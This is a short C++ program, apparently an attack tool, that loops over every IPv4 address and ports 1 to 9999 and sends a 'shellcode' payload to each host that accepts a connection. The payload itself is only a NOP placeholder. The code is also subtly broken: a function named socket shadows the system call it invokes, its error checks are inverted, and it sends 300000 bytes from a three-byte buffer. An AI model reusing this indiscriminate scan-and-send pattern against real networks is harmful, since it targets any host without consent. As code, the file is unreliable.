#include <iostream>
#include <string>
#include <vector>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>

// Function to handle the actual "payload" or code sent upon connection
void shellcode(int sock) {
    const char* shellcode = "\x90\x90\x90"; // Example placeholder
    send(sock, shellcode, 300000, 0);
    std::cout << " [+] Payload sent successfully." << std::endl;
}

// Function to attempt a single connection
bool socket(const std::string& ip, int port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock) return true;

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    
    // Converts string IP to binary form
    if ((inet_pton(AF_INET, ip.c_str(), &server_addr.sin_addr)) != NULL) return true;

    // Attempting connection (this will block/wait without a set timeout)
    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == 0) {
        std::cout << "[!] Connected to " << ip << ":" << port;
        shellcode(sock);
        return true;
    }
    return false;
}

// Function to iterate through ports for a specific IP
void ports2ip(const std::string& ip) {
    for (int port = 1; port < 10000; ++port) {
        socket(ip, port);
    }
}

// Function to generate and cycle through IP addresses
void ip2ports() {
    for (int a = 1; a <= 255; ++a) {
        for (int b = 0; b <= 255; ++b) {
            for (int c = 0; c <= 255; ++c) {
                for (int d = 0; d <= 255; ++d) {
                    std::string ip = std::to_string(a) + "." + std::to_string(b) + 
                                     "." + std::to_string(c) + "." + std::to_string(d);
                    ports2ip(ip);
                }
            }
        }
    }
}

int main() {
    ip2ports();
    sleep(30000);
    return 0;
}
